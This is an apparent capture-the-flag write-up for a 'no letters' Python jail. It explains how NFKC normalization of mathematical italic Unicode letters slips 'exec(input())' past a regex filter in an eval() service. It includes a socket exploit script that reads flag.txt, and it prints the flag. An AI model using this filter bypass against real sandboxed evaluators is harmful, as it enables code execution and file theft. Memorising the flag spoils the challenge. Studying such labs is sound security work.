# Challenge 04: Terminal Echo (No Letters)

**Concept:** Extreme Python PyJail (Unicode Normalization Bypass)
**Difficulty:** 🔴 Hard

## Objective
Players are connected to a Python script that evaluates any code they provide via `eval()`.
However, there is a strict Regex firewall: `re.search(r'[a-zA-Z0-9]', user_input)`. 
If a single ASCII letter or number is detected, the program terminates immediately.

## Solution
How do you execute commands without typing letters or numbers?
The trick relies on **Python 3's PEP 3131: Non-ASCII Identifiers**. 
Python 3 normalizes Unicode identifiers using NFKC normalization. This means that mathematical bold, italic, or script characters (which are not in the `a-zA-Z` range and bypass the regex) are silently converted into standard ASCII letters by the Python interpreter during execution!

For example, the mathematical italic letters for `exec` are `𝘦𝘹𝘦𝘤`.
The mathematical italic letters for `input` are `𝘪𝘯𝘱𝘶𝘵`.

If we submit `𝘦𝘹𝘦𝘤(𝘪𝘯𝘱𝘶𝘵())`, the regex sees non-ascii characters and allows it through.
The Python `eval()` function evaluates it, normalizes it to `exec(input())`, and executes it!

Once `exec(input())` is running, it pauses and waits for standard input. Because this new `input()` call happens *inside* the execution context and not through the initial PyJail script, the secondary input is completely unfiltered! 

We can simply send `print(open('flag.txt').read())` as the secondary input to read the flag.

### Exploit Script (test_exploit.py)
```python
import socket
import time

def test_exploit():
    s = socket.socket()
    s.connect(("127.0.0.1", 9004))
    
    # Wait for the banner
    time.sleep(0.5)
    s.recv(1024)
    
    # Send the first payload: Mathematical Italic characters for "exec(input())"
    # e x e c = \U0001D626 \U0001D639 \U0001D626 \U0001D624
    # i n p u t = \U0001D62A \U0001D62F \U0001D631 \U0001D636 \U0001D635
    
    bypass_payload = "\U0001D626\U0001D639\U0001D626\U0001D624(\U0001D62A\U0001D62F\U0001D631\U0001D636\U0001D635())\n"
    s.send(bypass_payload.encode('utf-8'))
    
    time.sleep(0.5)
    s.recv(1024)
    
    # Send the secondary unfiltered payload
    final_payload = "print(open('flag.txt').read())\n"
    s.send(final_payload.encode('utf-8'))
    
    time.sleep(0.5)
    flag_resp = s.recv(1024).decode()
    print("Final output:")
    print(flag_resp)

if __name__ == "__main__":
    test_exploit()
```

## Flag
`BVAULT{n0_l3tt3r5_n0_pr0bl3m_un1c0d3_m4g1c}`
